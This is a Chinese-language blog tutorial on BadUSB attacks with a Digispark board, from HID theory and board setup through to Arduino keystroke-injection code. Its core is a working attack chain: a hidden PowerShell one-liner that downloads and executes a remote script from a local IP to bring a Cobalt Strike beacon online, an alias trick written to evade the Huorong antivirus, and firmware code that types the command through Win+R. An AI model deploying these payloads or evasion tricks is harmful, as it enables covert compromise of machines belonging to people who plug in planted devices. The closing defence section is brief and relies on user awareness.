---
title: 近源渗透之BadUSB
date: 2023/10/7 19:48:25
categories:
- 渗透测试
tags:
- 近源渗透
---
# 原理

**诞生**

在2014年的BlackHat大会上，信息安全专家展示了一种新的网络安全威胁，这种技术被称为BadUSB，实际上是HID攻击，该漏洞由Karsten Nohl和Jakob Lell共同发现。



**HID**

HID是"Human Interface Device"的缩写，中文意为"人机接口设备"。HID是一种用于计算机和其他电子设备之间进行交互的标准化协议和接口。HID包括多种输入和输出设备，例如键盘、鼠标、游戏手柄、触摸屏、扫描仪等。这些设备通过HID协议与计算机通信，使用户能够通过这些设备与计算机进行交互操作。



**HID攻击**

一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将**含有攻击向量的鼠标或键盘插入电脑**时，**恶意代码会被加载并执行**。



**BadUsb的结构**

BadUsb的内部结构如下

![image.png](../images/942cb02d-5333-4938-85ac-973f4c867ef4.png)

可以看到，U盘大致由两部分组成，一部分是芯片引导程序，一部分是闪存区域。

控制器负责与PC的通讯和识别，闪存用来做数据存储；

闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；



**BadUsb攻击**

BadUsb的攻击与HID攻击类似，也是插入电脑后加载并执行恶意代码从而完成攻击。

BadUsb插入PC后，会模拟出一个虚拟键盘，同时执行我们事先写入到固件中的代码来敲击相应的按键，输入攻击代码从而完成一些恶意行为。



**BadUsb优势**

- 只需要使用通用的USB设备（比如U盘）就可以完成HID攻击。
- 恶意代码烧录到固件中，而这部分区域是杀毒软件无法访问的区域，因此大部分杀毒软件是根本无法应对BadUsb攻击的



**常见攻击场景**

黑客故意将写入了恶意程序的BadUsb丢在某个场所里，如果有人因为好奇心将BadUsb插入电脑中，那么其中的恶意程序就会运行，黑客从而可以控制这个人的电脑。比如护网行动，好奇的蓝方人员的电脑被红方人员以这种方式控制😨。



# 工具准备

- 某宝开发板（关键词digispark）

  ![](../images/image-20231007114326582.png)

- Ardunio IDE

  下载地址https://www.arduino.cc/en/software

  下载完后打开Arduino IDE-->文件-->首选项-->附加管理器网址：http://digistump.com/package_digistump_index.json

  ![image-20231007130123285](../images/image-20231007130123285.png)

  工具-->开发板-->开发板管理器-->安装`Digistump AVR` 软件包

  ![image-20231007130250973](../images/image-20231007130250973.png)

- Digispark驱动

  https://github.com/digistump/DigistumpArduino/releases/tag/1.6.7

- CobaltStrike



# 开发板连接

板子成功连接电脑后，可以在设备管理器中看到

![image-20231007130836961](../images/image-20231007130836961.png)

遇到一个问题就是，这玩意插上去没有显示端口，Ardunio连接不了，而且一直闪红灯😢。

经过搜索才知道, 这块板子接上电源只保持 `5s` 的连接, 然后自动运行板子内的程序。

所以正确的烧录方式是先点击上传, 等到终端提示接入设备的时候, 再接入设备烧录程序。

![image-20231007130725980](../images/image-20231007130725980.png)



# DigiKeyboard.h使用

主要利用该库来模拟键盘和鼠标输入

在github上找到了数字按键表

![KeyCodes](../images/68747470733a2f2f736372697074656c2e636f6d2f4b6579626f617264456d756c6174696f6e4150492f4a6176615363726970742f696d616765732f6b6579626f6172642d6964656e746966696572732e706e67)

预设常量

https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h

常用函数

```c
DigiKeyboard.println("text"); # 用于向模拟键盘发送文本并在计算机上输入一行字符并自动在末尾添加一个回车符

DigiKeyboard.sendKeyStroke(key); # 用于模拟按下和释放一个指定的按键

DigiKeyboard.delay(ms) # 用于在执行后续操作前暂停一段时间，单位为毫秒
```





# 弹计算器

Arduino代码

```c
#include "DigiKeyboard.h"
String a;
String b;
String c;

void setup() {
DigiKeyboard.sendKeyStroke(0);

DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(57); // 开启CapsLock大写锁定键绕过中文输入法问题(windows大小写不敏感)
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // 按下Win+R键
DigiKeyboard.delay(800);
DigiKeyboard.println("calc"); // 打开计算器
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(57); // 关闭CapsLock大写锁定键
 
}

void loop() {
   
}
```

![动画](../images/动画.gif)



# PowerShell  Bypass火绒上线CS

[干货 | 我的powershell免杀之路 (qq.com)](https://mp.weixin.qq.com/s/5Bx9fYiI_mK2yimSsDyhoA)

原始payload

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.23.102:8000/one_liner.ps1'))"
```

![image-20231007134142125](../images/image-20231007134142125.png)

Bypass

```powershell
powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://192.168.23.102:8000/one_liner.ps1')
```

转化为Arduino代码

```c
#include "DigiKeyboard.h"
String a;
String b;
String c;

void setup() {
DigiKeyboard.sendKeyStroke(0);

DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(57);//开启CapsLock大写锁定键
DigiKeyboard.delay(300);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//按下Win+R键
DigiKeyboard.delay(800);
DigiKeyboard.println("powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('http://192.168.23.102:8000/one_liner.ps1')");
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(57);//关闭CapsLock大写锁定键
 
}

void loop() {
   
}
```

![22](../images/22.gif)



# 防御

由于恶意代码内置于设备初始化固件中，而不是通过autorun.inf等媒体自动播放文件进行控制，因此无法通过禁用媒体自动播放进行防御，杀毒软件更是无法检测设备固件中的恶意代码。目前也没有什么有效的方式去防御BadUSB，毕竟无法阻挡电脑去识别键盘鼠标此类的HID设备。所以说针对BadUSB的防御方法还是在于人员的安全意识上，当发现可疑的U盘时切莫因好奇插入自己的电脑。